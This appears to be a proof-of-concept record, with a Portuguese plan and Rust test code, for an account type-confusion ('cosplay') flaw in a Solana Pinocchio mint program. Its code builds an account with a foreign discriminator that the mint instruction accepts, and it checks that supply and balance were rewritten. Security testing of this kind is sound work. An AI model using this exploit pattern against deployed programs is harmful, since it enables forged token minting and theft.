{
  "plan": "O programa `mint` (Pinocchio) lê supply e balance de offsets fixos 40..48 e 48..56 sem verificar discriminador de tipo. Vou preparar uma conta 'ledger' legítima com esses campos e chamar baseline com IX_MINT=2 e amount=10, provando que o cenário está correto. No ataque, passarei uma conta de outro tipo (dados diferentes nos primeiros bytes, mas com bytes 40..56 interpretáveis como supply/balance) para a mesma instrução, sem alterar o restante. O efeito medido será que a instrução aceitou a conta estranha e gravou os novos valores nos offsets 40..56, demonstrando o COSPLAY.",
  "scenario": "let ledger_key = Pubkey::new_unique();
let mut ledger_data = vec![0u8; 64];
ledger_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador de outro tipo
ledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let ledger = account(&env.program_id, &ledger_data, None);

let amount: u64 = 10;
let mut ix_data = vec![2u8];
ix_data.extend_from_slice(&amount.to_le_bytes());
let ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);
let contas = vec![(ledger_key, ledger.clone())];

let r_base = env.baseline("mint legitimo", &ix, &contas);

let mut attack_data = vec![0u8; 64];
attack_data[0..8].copy_from_slice(&[0xBB; 8]); // discriminador diferente do baseline
attack_data[40..48].copy_from_slice(&100u64.to_le_bytes());
attack_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let attack_ledger = account(&env.program_id, &attack_data, None);
let attack_contas = vec![(ledger_key, attack_ledger)];

let r = env.attack("cosplay: conta de outro tipo como ledger", &ix, &attack_contas);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &ledger_key).data();
    env.effect("supply e balance atualizados em conta de outro tipo", read_u64(d, 40) == 110 && read_u64(d, 48) == 60);
}"
}

